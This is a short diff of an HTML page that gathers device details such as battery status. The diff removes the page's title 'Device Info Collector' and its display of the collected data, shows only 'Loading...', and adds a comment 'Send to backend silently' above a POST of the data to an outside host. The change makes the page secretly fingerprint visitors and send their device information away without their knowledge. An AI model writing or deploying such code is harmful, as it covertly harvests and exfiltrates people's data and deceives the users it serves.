@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Device Info Collector</title>
+  <title></title>
 </head>
 <body>
-  <h1>Collecting device info...</h1>
-  <pre id="output"></pre>
+  <h1>Loading...</h1>
 
   <script>
     async function collectDeviceInfo() {
@@ -36,8 +35,7 @@
         info.battery = "Battery API not supported";
       }
 
-      document.getElementById('output').textContent = JSON.stringify(info, null, 2);
-
+      // Send to backend silently
       fetch('https://backend-19oc.onrender.com/collect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
